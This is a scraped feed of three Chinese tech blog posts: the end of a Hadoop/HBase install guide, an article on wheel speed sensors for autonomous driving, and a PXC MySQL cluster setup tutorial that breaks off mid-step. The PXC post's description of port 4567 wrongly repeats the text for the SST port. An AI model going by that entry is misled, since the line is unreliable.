• 2.4.1 vi /etc/profile 编辑/etc/profile文件，在文件的末尾设置Hadoop环境变量
运行source /etc/profile 让修改后的/etc/profile文件立即生效
• 执行命令cd /home/root/apps/hadoop-2.9.2/etc/hadoop，切换到目录/home/root/apps/hadoop-2.9.2/etc/hadoop下。
• 编辑core-site.xml文件vi core-site.xml
• 编辑hdfs-site.xml文件，vi hdfs-site.xml
• 根据模板创建mapred-site.xml文件：cp mapred-site.xml.template mapred-site.xml
• 编辑mapred-site.xml文件
• 编辑yarn-site.xml文件vi yarn-site.xml
o yarn.nodemanager.aux-services：指定辅助服务
o yarn.resourcemanager.hostname：指定resourcemanager的地址
&lt;
property
&gt;
&lt;
name
&gt;
yarn.nodemanager.aux-services
&lt;/
name
&gt;
&lt;
value
&gt;
mapreduce_shuffle
&lt;/
value
&gt;
&lt;/
property
&gt;
&lt;
property
&gt;
&lt;
name
&gt;
yarn.resourcemanager.hostname
&lt;/
name
&gt;
&lt;
value
&gt;
hadp01
&lt;/
value
&gt;
&lt;/
property
&gt;
• 编辑hadoop-env.sh文件vi hadoop-env.sh
o 将默认的export JAVA_HOME=${JAVA_HOME}替换为export JAVA_HOME=/home/root/apps/jdk1.8.0_201
• 编辑yarn-env.sh文件i
o 将默认的# export JAVA_HOME=/home/y/libexec/jdk1.6.0/替换为export JAVA_HOME=/home/root/apps/jdk1.8.0_201，记得删除这一行最前面的#
• 编辑mapred-env.sh文件vi mapred-env.sh
o 将默认的# export JAVA_HOME=/home/y/libexec/jdk1.6.0/替换为export JAVA_HOME=/home/root/apps/jdk1.8.0_201，记得删除这一行最前面的#
• 编辑slaves文件vi slaves
o 将默认的localhost改为hadp01
2.5运行启动hadoop
• 格式化namenode节点：hdfs namenode -format
• 启动Hadoop集群
o cd /home/root/apps/hadoop-2.9.2/sbin
o ./start-all.sh
o 提示Are you sure you want to continue connecting (yes/no)?时，输入yes
• jps显示当前所有java进程pid，查看Hadoop是否启动成功（NameNode,SecondaryNameNode,DataNode,ResouceManager,NodeManager）
• 在Windows中启动浏览器查看运行情况（推荐使用Google Chrome浏览器）
o HDFS的Web页面：192.168.37.182:50070
o YARN的Web页面：192.168.37.182:8088
3. 安装Hbase
3.1 准备安装文档。
• 在Windows中下载HBase，下载链接：https://archive.apache.org/dist/hbase/2.2.6/hbase-2.2.6-bin.tar.gz
• 利用MobaXterm，将Windows中保存的hbase-2.2.6-bin.tar.gz拷贝到hadp02虚拟机，存储位置：/home/root/
• 在hadp01中切换到HBase安装文件所在目录：cd /home/root
• 解压缩到apps目录中：tar -xzvf hbase-2.2.6-bin.tar.gz -C apps
3.2配置环境变量
• 编辑/etc/profile文件，vi /etc/profile，，在文件末尾增加内容如下：
• 并使修改的profile文件生效：source /etc/profile
3.3修改Hbase配置文件
• 切换到配置文件目录：cd /home/root/apps/hbase-2.2.6/conf
• 编辑hbase-env.sh文件：vi hbase-env.sh
o 配置JAVA_HOME，HBASE_MANAGES_ZK
o 找到# export JAVA_HOME=/usr/java/jdk1.6.0/，修改为export JAVA_HOME=/home/root/apps/jdk1.8.0_201（注意：要去掉最前面的#）
o 找到如下代码
# Tell HBase whether it should manage it's own instance of Zookeeper or not.
# export HBASE_MANAGES_ZK=true
去掉export前面的#，修改效果如下：
# Tell HBase whether it should manage it's own instance of Zookeeper or not.
export HBASE_MANAGES_ZK=true
• 编辑hbase-site.xml文件：vi hbase-site.xml
o 修改第一项hbase.cluster.distributed的value值为true，并添加部分内容，修改后文件如下：
• 编辑regionservers文件：vi regionservers，删除原有内容localhost，修改内容为：
3.4启动hbase。
• 启动hdfs集群
• 启动hbase
• 检查启动状态。
o 输入jps，查看进程中是否包含HMaster、HRegionServer、HQuorumPeer
o 在Windows环境下，启动Chrome浏览器，输入：192.168.37.182:16010
• 命令行形式操作hbase。
4.总结
这个搭建过程主要是CentOS上成功完成了Hadoop和HBase的伪分布式安装。主要包括环境配置、Hadoop与HBase的安装、配置与测试。
如果对您有帮助，希望您能给我点个赞~！
5.参考资料
（1）HBase基础知识
https://www.cnblogs.com/boanxin/p/10407778.html
https://blog.csdn.net/qq_1018944104/article/details/85013790?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param
（2）搭建5个节点的hadoop集群环境（CDH5）
https://blog.csdn.net/u010270403/article/details/51446674
（3）HBase完全分布式集群环境搭建过程总结
https://blog.csdn.net/qq_38586378/article/details/81352358
附选：
Oracle的安装与卸载
目的与要求
掌握Oracle 10g数据库服务器的安装与配置
掌握Oracle 10g数据库服务器安装过程中问题的解决</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540106.html</guid><pubDate>Fri, 31 Oct 2025 07:24:20 +0000</pubDate></item><item><title>自动驾驶系列—从速度感知到车身控制：轮速计在自动驾驶中的应用</title><link>https://www.ppmy.cn/news/1540107.html</link><description>🌟🌟 欢迎来到我的技术小筑，一个专为技术探索者打造的交流空间。在这里，我们不仅分享代码的智慧，还探讨技术的深度与广度。无论您是资深开发者还是技术新手，这里都有一片属于您的天空。让我们在知识的海洋中一起航行，共同成长，探索技术的无限可能。
🚀 探索专栏：学步_技术的首页 —— 持续学习，不断进步，让学习成为我们共同的习惯，让总结成为我们前进的动力。
🔍 技术导航：
人工智能
：深入探讨人工智能领域核心技术。
自动驾驶
：分享自动驾驶领域核心技术和实战经验。
环境配置
：分享Linux环境下相关技术领域环境配置所遇到的问题解决经验。
图像生成
：分享图像生成领域核心技术和实战经验。
虚拟现实技术
：分享虚拟现实技术领域核心技术和实战经验。
🌈 非常期待在这个数字世界里与您相遇，一起学习、探讨、成长。不要忘了订阅本专栏，让我们的技术之旅不再孤单！
💖💖💖 ✨✨ 欢迎关注和订阅，一起开启技术探索之旅！ ✨✨
文章目录
1. 背景介绍
2. 工作原理
2.1 信号检测
2.2 信号传输
2.3 速度计算
2.4 前进方向和滑动情况
3. 分类
4. 应用类型
5. 核心关键指标
6. 优缺点
6.1 优点
6.2 缺点
7. 选型指南
7.1 精度和分辨率
7.2 响应速度
7.3 耐久性与环境适应性
7.4 通信接口与兼容性
8. 轮胎压力标定
8.1 **轮胎压力与轮胎半径**
8.2 **轮胎压力对里程计算的影响**
8.3 **轮胎压力监测系统（TPMS）与轮速计的协同工作**
8.4 **胎压标定与校正方法**
8.5 **轮胎压力标定的未来发展**
8.6 小结
9. 应用场景
10. 总结与讨论
1. 背景介绍
在自动驾驶技术中，精确的速度和位置感知是实现车辆平稳行驶和安全驾驶的重要基础。
为了准确掌握车辆的行驶速度，轮速计（Wheel Speed Sensor）成为了核心组件之一。它通过测量车轮的转动速度，为车辆的控制系统提供实时的速度数据。
这些数据不仅能用于自动驾驶系统中的导航和定位，还能辅助车辆的稳定控制系统（如防抱死制动系统 ABS、车身电子稳定系统 ESP），确保车辆在各种工况下都能稳定运行。
2. 工作原理
轮速计的工作原理相对简单，主要通过测量车轮的转动来推导车辆的速度，但其背后的技术机制却相当精巧。
轮速计通常安装在车轮毂上，感知车轮的每次转动，并将这些数据转化为脉冲信号，供车辆的电子控制单元（ECU）处理和分析。
2.1 信号检测
轮速传感器的核心功能是检测车轮的每次转动。它通常使用以下两种常见的检测技术：
磁性传感器
：通过霍尔效应或电磁感应，感应车轮上的磁场变化。当车轮上的齿轮或特定部件通过传感器时，磁场会发生变化，从而生成电信号。这种方法在许多应用场景下非常可靠，尤其是对恶劣环境的耐受性较好。
光电传感器
：通过光束的阻挡或反射来检测车轮的旋转。当车轮转动时，光电传感器会根据车轮的角度变化生成光信号，并转化为脉冲信号。这种方法的精度较高，但可能会受到灰尘或杂物的影响，需要定期维护。
2.2 信号传输
当传感器检测到车轮转动时，会生成相应的脉冲信号。
传感器将这些信号通过电缆或无线方式传送给车辆的电子控制单元（ECU）。ECU 作为车辆的大脑，负责接收并分析这些信号，确保车辆在行驶过程中能及时得到精确的速度信息。
2.3 速度计算
车辆的 ECU 收到轮速传感器传递的脉冲信号后，会根据这些信号计算出车轮的转速。具体计算方法通常基于以下步骤：
脉冲计数
：ECU 根据轮速传感器的脉冲信号计数车轮的转动次数。
时间计算
：通过记录脉冲发生的时间间隔，ECU 能够确定车轮每次转动所需的时间。
速度推导
：车辆的实际速度可以通过车轮的周长（取决于轮胎的尺寸）乘以转速来计算。例如，如果一个轮胎的周长是2米，ECU 通过计算出每秒车轮转动的次数，就可以确定车辆的行驶速度。
2.4 前进方向和滑动情况
除了计算车轮的转速，轮速计还能够推导出车辆的前进方向和滑动情况。当车辆出现打滑现象（例如在湿滑路面上），各个车轮的转速可能会出现差异。此时，ECU 通过对比四个车轮的转速差，能够检测到异常情况，并启动稳定控制系统（如防抱死制动系统 ABS 或车身电子稳定系统 ESP），迅速做出制动调整，确保车辆的安全行驶。
轮速计的工作原理虽然表面上看似简单，但它通过精密的信号检测、传输和计算过程，为车辆的自动驾驶和控制系统提供了至关重要的实时数据。
3. 分类
根据传感器的工作原理，轮速计可分为以下几类：
磁感应轮速传感器
：利用霍尔效应感应车轮上的磁场变化。每当磁场变化时，传感器会产生信号，从而计算车轮的旋转速度。
光电轮速传感器
：通过光束的阻挡或反射检测车轮的转动。每当光束被打断或反射时，传感器会产生脉冲信号，用于计算车轮的速度。
电涡流轮速传感器
：利用电涡流效应感应金属物体的转动，通过对转动产生的涡流变化进行监测，计算出车轮的速度。
4. 应用类型
轮速计在自动驾驶中的应用范围较广，主要包括以下场景：
行驶速度检测
：通过监测车轮的转动速度，轮速计为车辆的自动驾驶系统提供精确的速度信息，确保车辆能够在各种速度下平稳运行。
防抱死制动系统（ABS）
：轮速计能实时检测车轮的滑动情况，防止车轮在急刹车时抱死，从而提高行车安全性。
车身电子稳定系统（ESP）
：通过检测车轮的转动，轮速计可以帮助ESP系统判断车辆是否失控，并及时进行调整。
里程计
：轮速传感器能计算车辆的总行驶里程，帮助车辆管理系统估算维修、保养时间。
5. 核心关键指标
在选择轮速计时，需要考虑以下几个关键技术指标：
指标
说明
精度
轮速计的精度决定了速度检测的准确性，高精度传感器有助于提高自动驾驶的安全性。
分辨率
传感器的分辨率决定了它能够检测到多小的速度变化。更高的分辨率意味着更细致的速度变化监测。
响应时间
轮速计的响应时间越快，系统对速度变化的反应也就越快，尤其是在急刹车和转弯时。
耐用性
传感器的耐用性决定了它在复杂工况下（如雨雪、泥泞等）的表现。
工作温度范围
轮速计需要能够在极端温度下正常工作，例如寒冷的冬季或高温的夏季。
6. 优缺点
6.1 优点
实时性强
：轮速计能实时提供车辆的速度信息，对于自动驾驶系统来说至关重要。
结构简单
：轮速计结构较为简单，安装方便，适合多种车型。
成本低
：相比于其他高端传感器如激光雷达，轮速计的成本较低，易于大规模部署。
6.2 缺点
环境依赖性
：轮速计的性能可能受到外部环境（如积水、泥浆）的影响，导致数据误差。
滑动情况误差
：当车辆出现打滑或轮胎损坏时，轮速计提供的数据可能不准确，尤其是在雪地或湿滑路面上。
7. 选型指南
在选择适合自动驾驶系统的轮速计时，需综合考虑多个技术因素，以确保其能够满足车辆在复杂路况下的使用需求。以下是关键的选型要点：
7.1 精度和分辨率
精度
：轮速计的精度直接影响车辆速度的测量结果。高精度的轮速计能捕捉到极微小的速度变化，这对于高速行驶或细微的滑动检测尤为重要。在自动驾驶系统中，精度的提升有助于系统做出更加可靠的决策。
分辨率
：分辨率指的是轮速传感器能够检测到的最小角度变化。高分辨率意味着能够更准确地检测车轮的旋转次数和角度，这对于平滑控制车辆加速或减速至关重要。例如，高分辨率轮速传感器可以通过精细的脉冲计数来提高速度计算的准确性，确保在快速变速时系统不会出现延迟或误判。
7.2 响应速度
轮速计的响应速度必须足够快，以确保能够及时捕捉到车辆速度的变化。特别是在紧急制动或快速加速的情况下，轮速计需要即时将数据传输到电子控制单元（ECU），以便系统及时调整车辆控制策略。因此，选择具有高速响应能力的传感器能够有效提升自动驾驶的安全性和控制效率。
7.3 耐久性与环境适应性
自动驾驶车辆需要面对各种复杂的路况和天气条件，因此轮速计的耐久性和环境适应性显得尤为重要：
防水防尘性能
：在雨雪、沙尘等恶劣天气中，轮速计的防水、防尘性能至关重要。这类传感器通常需要达到 IP67 或更高的防护等级，才能在长时间暴露在水和灰尘中仍能正常工作。
耐高温与耐低温性能
：车辆在高温或寒冷环境下行驶时，轮速计应能保持稳定的工作性能。轮速计需要在-40°C至+150°C的温度范围内正常运行，以确保系统在不同气候条件下的可靠性。
抗震动和耐磨性
：在复杂路况下，轮速计需要承受车轮的剧烈震动和摩擦。良好的抗震和耐磨性能能够延长轮速计的使用寿命，减少频繁更换的成本。
7.4 通信接口与兼容性
轮速计与自动驾驶系统的 ECU 之间的通信需要采用稳定可靠的协议，常见的通信接口包括 CAN 总线或 LIN 总线。确保轮速计与车辆其他传感器和控制系统之间的兼容性，能够简化集成过程，并提高整个系统的稳定性。
以下是市面上常见的几款用于自动驾驶系统的轮速计型号：
轮速计型号
制造商
关键特点
应用场景
价格区间
Bosch DF11
Bosch
高精度、耐高温、快速响应
乘用车、商用车自动驾驶系统
150-200元
Continental SEV-1
Continental
防水、防尘、抗震
复杂环境下的长时间工作
100-180元
Denso WSS-D
Denso
小巧、低功耗、分辨率高
城市自动驾驶与泊车辅助系统
80-150元
ZF TRW WS10
ZF TRW
高分辨率、耐高温、防尘
自动驾驶安全系统（如ABS、ESP）
120-170元
Hella HG-1
Hella
高耐久性、广泛的环境适应性
重型商用车自动驾驶
130-210元
在选择适合的轮速计时，除了要考虑上表中的关键因素，还需根据具体的应用场景和预算进行权衡。对于高速公路上的自动驾驶场景，高精度和高分辨率是首要考虑因素；而对于城市中的低速行驶或泊车辅助系统，耐久性和抗环境能力则更加重要。
8. 轮胎压力标定
轮速计在自动驾驶系统中扮演着关键的角色，它通过检测车轮的转速来推算车辆的实际行驶速度。
然而，轮速计的精度还受到轮胎压力的影响，这一点在自动驾驶系统中同样不容忽视。
轮胎压力标定
不仅影响轮胎的接地面积、抓地力和摩擦力，还直接影响轮胎的半径，从而影响轮速计的精确度。
以下是轮胎压力标定的重要性和影响因素：
8.1
轮胎压力与轮胎半径
轮胎的实际半径在受压状态下会随着轮胎压力的变化而有所不同。当轮胎压力不足时，轮胎的变形增大，接地面积增加，轮胎的有效半径会减小，导致轮速计计算出的速度偏高。而当轮胎压力过高时，轮胎变形减少，接地面积减小，轮胎的半径增大，轮速计的计算结果会偏低。
由于轮速计是通过轮胎的转速和已知的轮胎半径来计算车辆的行驶速度的，轮胎压力的变化将直接影响计算的精度。因此，为了确保轮速计的精准度，轮胎压力的校准和持续监测是必要的。
8.2
轮胎压力对里程计算的影响
在自动驾驶场景中，轮速计不仅用于计算车辆的瞬时速度，还用于推算行驶的总里程。如果轮胎压力不准确，车辆在行驶过程中，轮胎的转动次数与实际路程将不完全匹配，导致里程计算出现偏差。尤其是在长时间驾驶或者长距离行驶的情况下，累积的误差可能会显著影响导航和车辆控制系统的准确性。
8.3
轮胎压力监测系统（TPMS）与轮速计的协同工作
现代车辆通常配备轮胎压力监测系统（TPMS），该系统能够实时监测每个车轮的胎压情况。当胎压异常时，TPMS 系统会发出警告信号。TPMS 与轮速计可以协同工作，在胎压出现异常的情况下，轮速计能够调整计算逻辑，防止因胎压变化而导致的误差累积。尤其是在自动驾驶中，这样的协同工作机制可以显著提升系统的安全性与可靠性。
8.4
胎压标定与校正方法
为了确保轮速计的测量精度和轮胎的安全性，车辆在日常使用中应保持轮胎压力在推荐范围内。此外，车辆的维护中应定期校准轮胎压力。以下是常见的轮胎压力标定和校正方法：
静态标定
：在车辆静止时测量轮胎的冷态压力，并与车辆手册中的推荐值进行比对。如果压力偏离推荐值，应及时进行充气或放气调整。
动态监测与调整
：在行驶过程中，利用 TPMS 实时监控胎压情况，当发现胎压偏离正常范围时，系统可以提醒驾驶员进行调整。
温度影响
：胎压随温度变化而波动，在不同季节或不同气候条件下，特别是高速长途驾驶过程中，应特别关注胎压的变化情况并进行必要的调整。
8.5
轮胎压力标定的未来发展
随着自动驾驶技术的发展，轮胎压力标定和监测技术也将得到进一步优化。例如，一些高级别的自动驾驶系统可能会集成更加精确的胎压监测和实时调整功能，使车辆能够根据不同的路况和驾驶模式自动调节胎压，确保轮速计测量的精度。
8.6 小结
轮胎压力标定不仅对车辆的行驶安全性和经济性有着重要影响，同时也影响着自动驾驶系统中轮速计的精度。通过合理的轮胎压力监测和校准机制，能够有效提高自动驾驶系统的稳定性和准确性。因此，在选型轮速计时，还应综合考虑胎压监测与校准的功能，以确保整体系统的最佳性能。
9. 应用场景
自动驾驶导航与定位
：轮速计通过记录车轮的转速，结合惯性测量单元（IMU）和 GPS 数据，可以为自动驾驶系统提供精准的定位信息。
紧急制动与转弯控制
：轮速计与防抱死系统（ABS）协同工作，在紧急制动时防止车轮抱死，提高车辆的安全性。
高精度地图匹配
：轮速计通过计算车辆的行驶速度和距离，帮助自动驾驶系统实现车辆在高精度地图中的位置匹配。
10. 总结与讨论
轮速计作为自动驾驶系统中的关键传感器之一，虽然其结构简单且成本较低，但它在车辆速度监控、ABS防抱死系统和车身稳定控制系统中发挥了极其重要的作用。尽管在某些复杂的环境下，如泥泞、积水或车轮打滑时可能出现误差，但通过与其他传感器的结合（如 IMU、GPS 和 LiDAR），轮速计能够在自动驾驶领域中实现良好的综合表现。未来，随着自动驾驶技术的不断发展，轮速计的技术性能将进一步提升，为无人驾驶车辆提供更加精准和可靠的速度数据支持。
🌟 在这篇博文的旅程中，感谢您的陪伴与阅读。如果内容对您有所启发或帮助，请不要吝啬您的点赞 👍🏻，这是对我最大的鼓励和支持。
📚 本人虽致力于提供准确且深入的技术分享，但学识有限，难免会有疏漏之处。如有不足或错误，恳请各位业界同仁在评论区留下宝贵意见，您的批评指正是我不断进步的动力！😄😄😄
💖💖💖 如果您发现这篇博文对您的研究或工作有所裨益，请不吝点赞、收藏，或分享给更多需要的朋友，让知识的力量传播得更远。
🔥🔥🔥 “Stay Hungry, Stay Foolish” —— 求知的道路永无止境，让我们保持渴望与初心，面对挑战，勇往直前。无论前路多么漫长，只要我们坚持不懈，终将抵达目的地。🌙🌙🌙
👋🏻 在此，我也邀请您加入我的技术交流社区，共同探讨、学习和成长。让我们携手并进，共创辉煌！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540107.html</guid><pubDate>Fri, 31 Oct 2025 07:24:22 +0000</pubDate></item><item><title>Linux云计算 |【第四阶段】RDBMS2-DAY5</title><link>https://www.ppmy.cn/news/1540108.html</link><description>主要内容：
PXC概述、部署PXC（自动故障恢复测试）、存储引擎、读锁/写锁、表锁/行锁、常用的存储引擎介绍
一、PXC概述
PXC（Percona XtraDB Cluster，简称PXC集群），是基于Galera的MySQL高可用集群解决方案，提供了多主复制、自动故障转移和数据一致性等特性。Galera Cluster是Codership公司开发的一套免费开源的高可用方案（MySQL发行版），PXC集群主要由两部分组成：Percona Server with XtraDB 和 Write Set Replication patches（使用了Galera library，一个通用的用于事务型应用的同步、多主复制插件）；可以实现多个节点间的数据同步复制以及读写，并且可保障数据库的服务高可用及数据一致性；PXC与mariadb的集群maridb-cluster原理是一样的。
官网地址：Galera Cluster for MySQL | The world's most advanced open-source database cluster.
1、PXC主要特性
1）多主复制：
PXC支持多主复制，这意味着每个节点都可以同时读写，没有单点故障。
所有节点都是对等的，任何节点都可以接受写操作。
2）数据一致性：
PXC使用Galera Cluster的同步复制技术，确保所有节点上的数据一致性。
事务在所有节点上同时提交，避免了数据不一致的问题。
3）自动故障转移：
当某个节点发生故障时，其他节点会自动接管，确保服务的连续性。
无需手动干预，系统会自动检测并处理故障。
4）高可用性：
PXC通过多节点部署和自动故障转移，提供了高可用性。
即使某个节点发生故障，集群仍然可以正常运行。
5）扩展性：
PXC支持水平扩展，可以通过增加节点来提高集群的处理能力。
每个节点都可以处理读写请求，提高了系统的整体性能。
6）低延迟复制：
PXC的复制是同步的，确保了低延迟的数据复制。
数据在所有节点上几乎同时更新，避免了数据延迟的问题。
2、PXC架构
基于Galera Cluster，主要由以下组件组成：
节点（Node）：
每个节点都是一个独立的MySQL实例，运行在不同的服务器上。节点之间通过Galera复制协议进行通信，确保数据一致性。
Galera复制插件：
Galera复制插件是PXC的核心组件，负责管理节点之间的数据复制。它确保所有节点上的数据一致性，并处理故障转移和节点加入/退出等操作。
wsrep API：
wsrep API是Galera Cluster的接口，用于与MySQL集成。它提供了事务处理、数据复制和节点管理等功能。
3、端口介绍
① 3306：数据库对外服务的端口号
说明：这是MySQL的标准端口，用于客户端连接到数据库服务器。PXC节点通过这个端口提供数据库服务，客户端可以通过这个端口进行读写操作。
② 4444：SST端口（State Snapshot Transfer）
说明：SST用于全量同步，当一个新的节点加入集群时，它需要从现有节点获取完整的数据副本。PXC支持多种SST方法，如xtrabackup、rsync和mysqldump。4444端口用于请求和传输这些全量数据。
③ 4567：集群通信端口
说明：SST用于全量同步，当一个新的节点加入集群时，它需要从现有节点获取完整的数据副本。PXC支持多种SST方法，如xtrabackup、rsync和mysqldump。4444端口用于请求和传输这些全量数据。
④ 4568：IST端口（Incremental State Transfer）
说明：IST用于增量同步，相对于SST来说，IST只传输自上次同步以来的增量数据。当一个节点加入集群时，如果已经有部分数据，可以通过IST端口获取增量数据，而不是全量数据。
4、名词介绍
SST（State Snapshot Transfer）：
全量同步：当一个新的节点加入集群时，它需要从现有节点获取完整的数据副本。SST通过4444端口进行全量数据的传输。
IST（Incremental State Transfer）：
增量同步：相对于SST来说，IST只传输自上次同步以来的增量数据。当一个节点加入集群时，如果已经有部分数据，可以通过IST端口获取增量数据，而不是全量数据。
WS（write set）：
写数据集：在PXC中，每个写操作（事务）都会生成一个写数据集（write set），这个写数据集包含了所有需要更新的数据和元数据。写数据集通过4567端口在节点之间进行复制，确保数据一致性。
部署PXC示例：
网络实验拓扑：
服务器角色：mysql1、mysql2、mysql3（三台相互独立的mysql服务器）
Mysql1：IP为192.168.2.11、安装Percona-XtraDB-Cluster
Mysql2：IP为192.168.2.12、安装Percona-XtraDB-Cluster
Mysql3：IP为192.168.2.13、安装Percona-XtraDB-Cluster
提示：提前关闭防火墙和SELinux
步骤1：初始化环境准备（主机名解析、安装软件包）
① 配置服务器的名称解析
[root@mysql1 ~]# for i in {1..3}
&gt; do
&gt; echo -e "192.168.2.1$i\tmysql$i" &gt;&gt; /etc/hosts
&gt; done
[root@mysql1 ~]# cat /etc/hosts
192.168.2.11    mysql1
192.168.2.12    mysql2
192.168.2.13    mysql3[root@mysql2 ~]# for i in {1..3}
&gt; do
&gt; echo -e "192.168.2.1$i\tmysql$i" &gt;&gt; /etc/hosts
&gt; done
[root@mysql1 ~]# cat /etc/hosts
192.168.2.11    mysql1
192.168.2.12    mysql2
192.168.2.13    mysql3[root@mysql3 ~]# for i in {1..3}
&gt; do
&gt; echo -e "192.168.2.1$i\tmysql$i" &gt;&gt; /etc/hosts
&gt; done
[root@mysql1 ~]# cat /etc/hosts
192.168.2.11    mysql1
192.168.2.12    mysql2
192.168.2.13    mysql3
② 准备yum源（参考：/linux-soft/4/pxc/Percona-XtraDB-Cluster-5.7.25-31.35-r463-el7-x86_64-bundle.tar）
[root@localhost ~]# cd pxc/
[root@ localhost pxc]# tar -xf Percona-XtraDB-Cluster-5.7.25-31.35-r463-el7-x86_64-bundle.tar
[root@ localhost pxc]# ls
[root@ localhost pxc]# cp *.rpm /var/www/html/mysql/   //复制解压的RPM包到/var/www/html/mysql/
[root@ localhost pxc]# cd /var/www/html/mysql/
[root@ localhost mysql]# createrepo -v .[root@localhost ~]# scp /etc/yum.repos.d/mysql.repo root@192.168.2.11:/etc/yum.repos.d/
[root@localhost ~]# scp /etc/yum.repos.d/mysql.repo root@192.168.2.12:/etc/yum.repos.d/
[root@localhost ~]# scp /etc/yum.repos.d/mysql.repo root@192.168.2.13:/etc/yum.repos.d/
③ 安装软件包（qpress.x86_64、Percona-XtraDB-Cluster-*）
[root@mysql1 ~]# yum clean all
[root@mysql1 ~]# yum -y install qpress.x86_64 Percona-XtraDB-Cluster-*
[root@mysql1 ~]# id mysql
uid=997(mysql) gid=995(mysql) 组=995(mysql)[root@mysql2 ~]# yum clean all
[root@mysql2 ~]# yum -y install qpress.x86_64 Percona-XtraDB-Cluster-*[root@mysql3 ~]# yum clean all
[root@mysql3 ~]# yum -y install qpress.x86_64 Percona-XtraDB-Cluster-*
补充：如果有MySQL.，需要yum remove -y mysql-community-*卸载
步骤2：配置PXC服务（mysqld.cnf、mysqld_safe.cnf、wsrep.cnf）
[root@mysql1 ~]# ls /etc/percona-xtradb-cluster.conf.d/
mysqld.cnf  mysqld_safe.cnf  wsrep.cnf
① 分别修改3台服务器的mysqld.cnf配置文件
[root@mysql1 ~]# rm -rf /var/lib/mysql/*    //建议清空原有MySQL数据目录
[root@mysql1 ~]# vim /etc/percona-xtradb-cluster.conf.d/mysqld.cnf
…
[mysqld]
server-id=11      //修改服务器标识（server-id=11）
datadir=/var/lib/mysql                   //工作目录
socket=/var/lib/mysql/mysql.sock         //socket目录
log-error=/var/log/mysqld.log            //日志目录
pid-file=/var/run/mysqld/mysqld.pid      //进程目录
log-bin          //开启binlog日志功能
log_slave_updates
expire_logs_days=7
…[root@mysql2 ~]# rm -rf /var/lib/mysql/*
[root@mysql2 ~]# vim /etc/percona-xtradb-cluster.conf.d/mysqld.cnf
...
[mysqld]
server-id=12      //修改服务器标识（server-id=12）
datadir=/var/lib/mysql                  //工作目录
socket=/var/lib/mysql/mysql.sock        //socket目录
log-error=/var/log/mysqld.log           //日志目录
pid-file=/var/run/mysqld/mysqld.pid     //进程目录
log-bin          //开启binlog日志功能
log_slave_updates
expire_logs_days=7
...[root@mysql3 ~]# rm -rf /var/lib/mysql/*
…
[mysqld]
server-id=13     //修改服务器标识（server-id=13）
datadir=/var/lib/mysql                 //工作目录
socket=/var/lib/mysql/mysql.sock       //socket目录
log-error=/var/log/mysqld.log          //日志目录
pid-file=/var/run/mysqld/mysqld.pid    //进程目录
log-bin         //开启binlog日志功能
log_slave_updates
expire_logs_days=7
…
② 分别修改3台服务器的mysqld_safe.cnf配置文件（使用默认配置即可）
[root@mysql1 ~]# vim /etc/percona-xtradb-cluster.conf.d/mysqld_safe.cnf
[mysqld_safe]
pid-file = /var/run/mysqld/mysqld.pid
socket   = /var/lib/mysql/mysql.sock
nice     = 0[root@mysql2 ~]# vim /etc/percona-xtradb-cluster.conf.d/mysqld_safe.cnf
[mysqld_safe]
pid-file = /var/run/mysqld/mysqld.pid
socket   = /var/lib/mysql/mysql.sock
nice     = 0[root@mysql3 ~]# vim /etc/percona-xtradb-cluster.conf.d/mysqld_safe.cnf
[mysqld_safe]
pid-file = /var/run/mysqld/mysqld.pid
socket   = /var/lib/mysql/mysql.sock
nice     = 0
③ 分别修改3台服务器的wsrep.cnf配置文件
[root@mysql1 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
…
wsrep_cluster_address=gcomm://192.168.2.11,192.168.2.12,192.168.2.13    //集群成员
wsrep_node_address=192.168.2.11    //本节点IP地址
wsrep_cluster_name=pxc-cluster     //集群名
wsrep_node_name=mysql1             //本节点名
wsrep_sst_auth="sstuser:NSD2021@tedu.cn"    //SST数据同步授权用户及密码
…[root@mysql2 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
…
wsrep_cluster_address=gcomm://192.168.2.11,192.168.2.12,192.168.2.13    //集群成员
wsrep_node_address=192.168.2.12     //本节点IP地址
wsrep_cluster_name=pxc-cluster      //集群名
wsrep_node_name=mysql2              //本节点名
wsrep_sst_auth="sstuser:NSD2021@tedu.cn"    //SST数据同步授权用户及密码
…[root@mysql3 ~]# vim /etc/percona-xtradb-cluster.conf.d/wsrep.cnf
…
wsrep_cluster_address=gcomm://192.168.2.11,192.168.2.12,192.168.2.13    //集群成员
wsrep_node_address=192.168.2.13     //本节点IP地址
wsrep_cluster_name=pxc-cluster      //集群名
wsrep_node_name=mysql3              //本节点名
wsrep_sst_auth="sstuser:NSD2021@tedu.cn"    //SST数据同步授权用户及密码
…
步骤3：启动PXC服务
所有数据库服务器都在同一个集群里，基于主主结构，自动同步数据且强一致性；
① 启动集群服务（首次启动服务时间比较长）（mysql1操作）
[root@mysql1 ~]# systemctl start mysql@bootstrap.service   //启动集群服务（集群环境初始化）
[root@mysql1 ~]# netstat -nlptu | grep :3306    //数据库服务端口
tcp6       0      0 :::3306                 :::*                    LISTEN      2419/mysqld
[root@mysql1 ~]# netstat -nlptu | grep :4567    //集群通信端口
tcp        0      0 0.0.0.0:4567            0.0.0.0:*               LISTEN      2419/mysqld
补充：mysql@bootstrap.service初始化集群服务，最先启动，且一般只需启动一次；
# 初始化数据库服务密码
[root@mysql1 ~]# grep password /var/log/mysqld.log    //查找日志生成随机登录密码
2021-06-16T03:12:37.699513Z 1 [Note] A temporary password is generated for root@localhost: +KduIl_.)655
[root@mysql1 ~]# mysqladmin -uroot -p'+KduIl_.)655' password 'NSD2021@tedu.cn';
# 添加授权SST数据同步授权用户sstuser（授权：reload,lock tables,replication client,process）
[root@mysql1 ~]# mysql -uroot -pNSD2021@tedu.cn
mysql&gt; grant reload,lock tables,replication client,process on *.* to sstuser@'localhost' identified by 'NSD2021@tedu.cn';
Query OK, 0 rows affected, 1 warning (0.00 sec)
② 启动mysql2、mysql3节点的mysql服务，其它节点将会自动同步mysql1服务器的数据、root初始密码、授权用户sstuser
[root@mysql2 ~]# systemctl start mysql    //注意：启动的是mysql服务，不是mysqld
[root@mysql2 ~]# netstat -utnlp | grep :3306    //数据库服务端口
tcp6     0      0 :::3306             :::*            LISTEN      2968/mysqld
[root@mysql2 ~]# netstat -utnlp | grep :4567    //集群通信端口
